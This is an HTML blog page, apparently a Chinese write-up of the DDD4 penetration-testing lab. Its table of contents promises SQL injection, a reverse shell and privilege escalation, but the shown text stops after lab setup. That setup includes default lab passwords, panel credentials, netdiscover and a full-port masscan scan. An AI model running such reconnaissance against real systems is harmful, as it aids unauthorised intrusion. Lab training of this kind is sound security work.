@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>红队实战之DDD4 - T0x1c</title>
+
+  
+    <meta name="description" content="ddd4靶场主要为Linux内网完整渗透，其中涉及多种技术，包括SQL注入、sudo提权、PHP代码审计、suid提权、SSH私钥登录、disable_functions绕过等知识。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红队实战之DDD4">
+<meta property="og:url" content="https://toxic80l.github.io/post/481150ce/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="ddd4靶场主要为Linux内网完整渗透，其中涉及多种技术，包括SQL注入、sudo提权、PHP代码审计、suid提权、SSH私钥登录、disable_functions绕过等知识。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-26%2018.09.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-26%20%E4%B8%8B%E5%8D%886.04.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-26%20%E4%B8%8A%E5%8D%884.13.35.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-26%20%E4%B8%8A%E5%8D%884.18.48.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-26%2018.28.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-26%2018.31.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-26%2018.47.48.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-26%2018.51.58.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-27%2001.08.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-28%2004.29.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-28%2004.27.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-28%2004.20.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2002.27.30.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-04%2001.12.57.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2004.27.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2004.29.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-08%2004.40.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2005.10.12.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2005.11.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2005.16.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2005.17.24.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2005.18.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2005.23.51.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2006.52.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2006.52.59.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2007.08.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2007.32.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2017.39.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2017.40.31.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2018.14.29.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2018.20.46.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2018.22.20.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2018.40.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2018.41.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2018.42.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2018.50.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2019.04.07.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2019.11.12.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2019.13.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2003.40.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2021.22.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2021.24.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2021.32.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2021.38.01.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2021.49.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2022.04.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2022.04.43.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2022.09.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2022.10.39.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2003.26.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2003.26.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2003.34.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2003.55.03.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.22.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2003.57.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.00.36.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.02.29.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.16.42.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.18.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.21.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.26.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.31.19.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.36.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-11%2004.37.38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.04.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.10.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.10.51.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.17.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.18.22.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.20.26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.21.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.22.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.23.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.25.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.27.00.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2004.17.23.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2003.33.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2004.53.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2005.00.52.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2005.03.50.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2005.04.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2000.46.21.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2000.49.57.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2001.00.52.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2001.11.59.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.12.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.13.43.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.19.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.14.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.32.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.37.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.39.29.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.41.28.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.44.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2002.53.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2020-05-17%2011.05.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2020-05-17%2011.05.21.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2020-05-17%2011.04.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2020-05-17%2011.14.31.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2020-05-17%2011.15.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/1.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2003.14.36.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2003.15.46.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-13%2003.18.56.png">
+<meta property="article:published_time" content="2022-07-12T19:55:54.000Z">
+<meta property="article:modified_time" content="2022-07-14T18:21:41.668Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="nmap">
+<meta property="article:tag" content="文件上传">
+<meta property="article:tag" content="metasploit">
+<meta property="article:tag" content="域名解析">
+<meta property="article:tag" content="gobuster">
+<meta property="article:tag" content="sudo">
+<meta property="article:tag" content="SSH">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="MySQL">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="代理隧道">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="FRP">
+<meta property="article:tag" content="PHPMyAdmin">
+<meta property="article:tag" content="菜刀">
+<meta property="article:tag" content="DocCMS">
+<meta property="article:tag" content="masscan">
+<meta property="article:tag" content="whatweb">
+<meta property="article:tag" content="Rogue-Mysql-Server">
+<meta property="article:tag" content="WDCP">
+<meta property="article:tag" content="disable_functions">
+<meta property="article:tag" content="LinEnum">
+<meta property="article:tag" content="linux-exploit-suggester">
+<meta property="article:tag" content="linuxprivchecker">
+<meta property="article:tag" content="suid">
+<meta property="article:tag" content="宝塔">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://toxic80l.github.io/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-26%2018.09.14.png">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">0x01 靶机环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%A4%96%E7%BD%91%E8%BE%B9%E7%95%8C%E7%AA%81%E7%A0%B4"><span class="toc-text">0x02 外网边界突破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3"><span class="toc-text">80端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#888%E7%AB%AF%E5%8F%A3"><span class="toc-text">888端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3306%E7%AB%AF%E5%8F%A3"><span class="toc-text">3306端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8888%E7%AB%AF%E5%8F%A3"><span class="toc-text">8888端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">PHP代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="toc-text">函数分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BB%BB%E6%84%8F%E8%BF%9E%E6%8E%A5"><span class="toc-text">数据库任意连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E6%96%87%E6%9B%BF%E6%8D%A2"><span class="toc-text">密文替换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">后台文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E6%A8%A1%E6%9D%BF%E8%8E%B7%E5%8F%96shell"><span class="toc-text">修改模板获取shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E4%B8%BB%E6%9C%BA%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">0x03 主机权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87disable-funcations"><span class="toc-text">绕过disable_funcations</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">MSF反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="toc-text">sudo提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-text">suid提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E6%8F%90%E6%9D%83"><span class="toc-text">宝塔面板提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-text">0x04 内网横向渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">基础环境信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8Bsocks%E4%BB%A3%E7%90%86"><span class="toc-text">建立socks代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%9D%83%E9%99%90%E8%8E%B7%E5%8F%96"><span class="toc-text">内网主机权限获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">内网主机权限提升</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E6%80%BB%E7%BB%93"><span class="toc-text">0x05 总结</span></a></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-07-12T19:55:54.000Z">2022-07-13</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>红队实战之DDD4</span></h1>
+<p>ddd4靶场主要为Linux内网完整渗透，其中涉及多种技术，包括SQL注入、sudo提权、PHP代码审计、suid提权、SSH私钥登录、disable_functions绕过等知识。<span id="more"></span></p>
+<h2 id="0x01-靶机环境搭建"><a href="#0x01-靶机环境搭建" class="headerlink" title="0x01 靶机环境搭建"></a>0x01 靶机环境搭建</h2><p>靶场中包含三台靶机，具体的网络拓扑图如下<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-26%2018.09.14.png" alt="截屏2022-06-26 18.09.14"></p>
+<p>根据拓扑图环境分别为两台主机配置不同的网卡<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-26%20%E4%B8%8B%E5%8D%886.04.23.png" alt="截屏2022-06-26 下午6.04.23"></p>
+<p>web 服务器管理员的默认密码为<code>yanisy123</code>，内网服务器管理员密码为<code>!@#ASD123.</code>，登录 web 服务器查看IP地址为<code>192.168.0.105</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-26%20%E4%B8%8A%E5%8D%884.13.35.png" alt="截屏2022-06-26 上午4.13.35"></p>
+<p>当然也可以使用 netdiscover 发现内网主机</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover 192.168.0.0/24</span><br></pre></td></tr></table></figure>
+
+<p>访问目标的宝塔管理界面，默认路径及账号密码如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">管理地址：http://192.168.0.105:8888/944906b5</span><br><span class="line">账号密码：gpeqnjf4/d12924fa</span><br></pre></td></tr></table></figure>
+<p>在运行环境中启动未启动的环境，比如 PHP 5.3、MySQL等服务<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-26%20%E4%B8%8A%E5%8D%884.18.48.png" alt="截屏2022-06-26 上午4.18.48"></p>
+<p>在 hosts 文件中绑定域名解析</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 配置</span></span></span><br><span class="line">192.168.0.105 www.ddd4.com</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-26%2018.28.34.png" alt="截屏2022-06-26 18.28.34"></p>
+<p>成功访问目标站点，靶机环境部署完成<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-26%2018.31.15.png" alt="截屏2022-06-26 18.31.15"></p>
+<h2 id="0x02-外网边界突破"><a href="#0x02-外网边界突破" class="headerlink" title="0x02 外网边界突破"></a>0x02 外网边界突破</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>使用 masscan 快速扫描目标全部端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo masscan -p 1-65535 192.168.0.105 --rate=200</span><br></pre></td></tr></table></figure>
